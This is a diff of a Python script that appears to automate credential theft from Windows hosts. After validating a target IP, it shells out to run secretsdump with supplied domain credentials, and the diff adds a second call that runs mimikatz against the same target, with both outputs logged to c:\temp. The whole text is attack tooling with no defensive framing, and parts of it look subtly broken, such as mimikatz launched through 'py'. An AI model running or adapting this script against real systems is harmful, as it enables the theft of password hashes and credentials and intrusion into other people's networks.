@@ -53,9 +53,16 @@ while validTargetIP is False:
     except socket.error:
         targetIP = input("The target IP you entered is not valid, please try again.\n")
 
-command = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\output.txt"
+secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\secOutput.txt"
 
 try:
-    os.system(command)
+    os.system(secCommand)
 except KeyError as e:
     print(f"There was an error: {e}")
+
+mimiCommand = (f"py {mimikatz_path} -f ./command.txt "
+               f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt")
+
+os.system(mimiCommand)
+
+
